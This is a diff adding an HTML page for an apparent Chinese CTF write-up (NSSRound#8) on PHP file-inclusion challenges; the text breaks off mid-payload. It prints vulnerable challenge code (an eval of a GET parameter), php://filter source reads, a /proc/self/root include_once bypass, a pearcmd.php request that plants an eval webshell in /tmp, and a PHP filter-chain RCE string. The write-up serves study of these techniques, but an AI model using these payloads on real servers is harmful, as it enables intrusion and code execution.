@@ -1,0 +1,786 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/leekos.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="leekos">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[TOC] MyDoorfilter伪协议读源码 1&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php  index.php 123456789101112131415161718&lt;?phperror_reporting(0);if (isset($_GET[&amp;#x27;N_S.S&amp;#x27;])) &amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NSSRound#8">
+<meta property="og:url" content="https://leekosss.github.io/2023/10/02/NSSRound#8/index.html">
+<meta property="og:site_name" content="Tranquility">
+<meta property="og:description" content="[TOC] MyDoorfilter伪协议读源码 1&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php  index.php 123456789101112131415161718&lt;?phperror_reporting(0);if (isset($_GET[&amp;#x27;N_S.S&amp;#x27;])) &amp;#">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310022001598.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310022052889.png">
+<meta property="article:published_time" content="2023-10-02T07:00:00.000Z">
+<meta property="article:modified_time" content="2023-10-02T13:06:10.681Z">
+<meta property="article:author" content="leekos">
+<meta property="article:tag" content="NSSRound#8">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310022001598.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>NSSRound#8 - Tranquility</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"leekosss.github.io","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tranquility</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="NSSRound#8"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-02 15:00" pubdate>
+          2023年10月2日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          11k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          89 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">NSSRound#8</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年10月2日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>[TOC]</p>
+<h2 id="MyDoor"><a href="#MyDoor" class="headerlink" title="MyDoor"></a>MyDoor</h2><p>filter伪协议读源码</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">/<span class="hljs-built_in">index</span>.php?<span class="hljs-keyword">file</span>=php://<span class="hljs-built_in">filter</span>/convert.base64-encode/resource=<span class="hljs-built_in">index</span>.php<br></code></pre></td></tr></table></figure>
+
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;N_S.S&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;N_S.S&#x27;</span>]);<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:/index.php?file=&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error.&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>使用<code>N[S.S</code>去传参<code>N_S.S</code></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202310022001598.png" srcset="/img/loading.gif" lazyload alt="image-20231002200109382"></p>
+<h2 id="MyPage"><a href="#MyPage" class="headerlink" title="MyPage"></a>MyPage</h2><p>和上一题一样也是文件包含，不过这里使用了<code>require_once</code>，导致我们不能读取flag.php、index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:/index.php?file=&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\.\.|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>        <span class="hljs-keyword">include_once</span> <span class="hljs-variable">$file</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error.&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>有几种方法：</p>
+<h3 id="0x01-proc命令妙用"><a href="#0x01-proc命令妙用" class="headerlink" title="0x01.proc命令妙用"></a>0x01.proc命令妙用</h3><p>之前我们以及接触过了<code>/proc</code>目录的妙用了，</p>
+<ul>
+<li><p><code>/proc/self</code>指向当前进程<code>/proc/pid/</code></p>
+</li>
+<li><p><code>/proc/self/cwd</code> 指向当前工作目录</p>
+</li>
+<li><p><code>/proc/self/root</code> 是指向 <code>/</code> 的符号链接</p>
+</li>
+</ul>
+<p>由于这里使用了<code>require_once</code>函数，所以我们需要绕过它</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，正常情况下，PHP会<br>将用户输入的文件名进行resolve，转换成标准的绝对路径，这个转换的过程会将…<span class="hljs-regexp">/、./</span>、软连<br>接等都进行计算，得到一个最终的路径，再进行包含。如果软连接跳转的次数超过了某一个上<br>限，Linux的lstat函数就会出错，导致PHP计算出的绝对路径就会包含一部分软连接的路径，<br>也就和原始路径不相同的，即可绕过include_once限制。<br></code></pre></td></tr></table></figure>
+
+<p>可以用伪协议配合<strong>多级符号链接</strong>的办法进行绕过</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/index.php?file=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode<span class="hljs-regexp">/resource=/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>cwd/flag.php<br></code></pre></td></tr></table></figure>
+
+<p><code>/proc/self/root</code>指向根<code>/</code>，叠加很多次可以绕过<code>include_once</code>，最后<code>/proc/self/cwd/flag.php</code>可以指向当前工作目录的<code>flag.php</code></p>
+<h3 id="0x02-pearcmd-php文件rce"><a href="#0x02-pearcmd-php文件rce" class="headerlink" title="0x02.pearcmd.php文件rce"></a>0x02.pearcmd.php文件rce</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/index.php?+config-create+/</span>&amp;file=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>php<span class="hljs-regexp">/pearcmd.php&amp;/</span>&lt;?=eval(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);?&gt;+<span class="hljs-regexp">/tmp/</span>shell.php<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="0x03-LFI2RCE"><a href="#0x03-LFI2RCE" class="headerlink" title="0x03.LFI2RCE"></a>0x03.LFI2RCE</h3><p>php filter chains 使用如下工具构造：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">php://filter/convert.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM921.NAPLPS|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.CP936|<span class="hljs-type">convert</span>.iconv.IBM<span class="hljs-number">-932.</span>UTF<span class="hljs-number">-8</span>|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM1161.IBM<span class="hljs-number">-932</span>|<span class="hljs-type">convert</span>.iconv.MS932.MS936|<span class="hljs-type">convert</span>.iconv.BIG5.JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.IBM869.UTF16|<span class="hljs-type">convert</span>.iconv.L3.CSISO90|<span class="hljs-type">convert</span>.iconv.UCS2.UTF<span class="hljs-number">-8</span>|<span class="hljs-type">convert</span>.iconv.CSISOLATIN6.UCS<span class="hljs-number">-4</span>|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.IBM869.UTF16|<span class="hljs-type">convert</span>.iconv.L3.CSISO90|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.L6.UNICODE|<span class="hljs-type">convert</span>.iconv.CP1282.ISO-IR<span class="hljs-number">-90</span>|<span class="hljs-type">convert</span>.iconv.CSA_T500.L4|<span class="hljs-type">convert</span>.iconv.ISO_8859<span class="hljs-number">-2.</span>ISO-IR<span class="hljs-number">-103</span>|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.863</span>.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.ISO6937.UTF16LE|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.INIS.UTF16|<span class="hljs-type">convert</span>.iconv.CSIBM1133.IBM943|<span class="hljs-type">convert</span>.iconv.GBK.BIG5|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.L5.UTF<span class="hljs-number">-32</span>|<span class="hljs-type">convert</span>.iconv.ISO88594.GB13000|<span class="hljs-type">convert</span>.iconv.CP950.SHIFT_JISX0213|<span class="hljs-type">convert</span>.iconv.UHC.JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.865</span>.UTF16|<span class="hljs-type">convert</span>.iconv.CP901.ISO6937|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM1161.IBM<span class="hljs-number">-932</span>|<span class="hljs-type">convert</span>.iconv.MS932.MS936|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.INIS.UTF16|<span class="hljs-type">convert</span>.iconv.CSIBM1133.IBM943|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP869.UTF<span class="hljs-number">-32</span>|<span class="hljs-type">convert</span>.iconv.MACUK.UCS4|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.ISO88597.UTF16|<span class="hljs-type">convert</span>.iconv.RK1048.UCS<span class="hljs-number">-4</span>LE|<span class="hljs-type">convert</span>.iconv.UTF32.CP1167|<span class="hljs-type">convert</span>.iconv.CP9066.CSUCS4|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.L6.UNICODE|<span class="hljs-type">convert</span>.iconv.CP1282.ISO-IR<span class="hljs-number">-90</span>|<span class="hljs-type">convert</span>.iconv.CSA_T500.L4|<span class="hljs-type">convert</span>.iconv.ISO_8859<span class="hljs-number">-2.</span>ISO-IR<span class="hljs-number">-103</span>|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.L6.UNICODE|<span class="hljs-type">convert</span>.iconv.CP1282.ISO-IR<span class="hljs-number">-90</span>|<span class="hljs-type">convert</span>.iconv.CSA_T500<span class="hljs-number">-1983.</span>UCS<span class="hljs-number">-2</span>BE|<span class="hljs-type">convert</span>.iconv.MIK.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CSIBM1161.UNICODE|<span class="hljs-type">convert</span>.iconv.ISO-IR<span class="hljs-number">-156.</span>JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.L5.UTF<span class="hljs-number">-32</span>|<span class="hljs-type">convert</span>.iconv.ISO88594.GB13000|<span class="hljs-type">convert</span>.iconv.CP950.SHIFT_JISX0213|<span class="hljs-type">convert</span>.iconv.UHC.JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.863</span>.UNICODE|<span class="hljs-type">convert</span>.iconv.ISIRI3342.UCS4|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.JS.UNICODE|<span class="hljs-type">convert</span>.iconv.L4.UCS2|<span class="hljs-type">convert</span>.iconv.UCS<span class="hljs-number">-4</span>LE.OSF05010001|<span class="hljs-type">convert</span>.iconv.IBM912.UTF<span class="hljs-number">-16</span>LE|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.MAC.UTF16|<span class="hljs-type">convert</span>.iconv.L8.UTF16BE|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM1161.IBM<span class="hljs-number">-932</span>|<span class="hljs-type">convert</span>.iconv.MS932.MS936|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP367.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM901.SHIFT_JISX0213|<span class="hljs-type">convert</span>.iconv.UHC.CP1361|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.L5.UTF<span class="hljs-number">-32</span>|<span class="hljs-type">convert</span>.iconv.ISO88594.GB13000|<span class="hljs-type">convert</span>.iconv.CP949.UTF32BE|<span class="hljs-type">convert</span>.iconv.ISO_69372.CSIBM921|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP861.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.L4.GB13000|<span class="hljs-type">convert</span>.iconv.BIG5.JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.L6.UNICODE|<span class="hljs-type">convert</span>.iconv.CP1282.ISO-IR<span class="hljs-number">-90</span>|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.L6.UNICODE|<span class="hljs-type">convert</span>.iconv.CP1282.ISO-IR<span class="hljs-number">-90</span>|<span class="hljs-type">convert</span>.iconv.CSA_T500<span class="hljs-number">-1983.</span>UCS<span class="hljs-number">-2</span>BE|<span class="hljs-type">convert</span>.iconv.MIK.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM921.NAPLPS|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.855</span>.CP936|<span class="hljs-type">convert</span>.iconv.IBM<span class="hljs-number">-932.</span>UTF<span class="hljs-number">-8</span>|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.8859</span>_3.UTF16|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.863</span>.SHIFT_JISX0213|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP1046.UTF16|<span class="hljs-type">convert</span>.iconv.ISO6937.SHIFT_JISX0213|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP1046.UTF32|<span class="hljs-type">convert</span>.iconv.L6.UCS<span class="hljs-number">-2</span>|<span class="hljs-type">convert</span>.iconv.UTF<span class="hljs-number">-16</span>LE.T<span class="hljs-number">.61</span><span 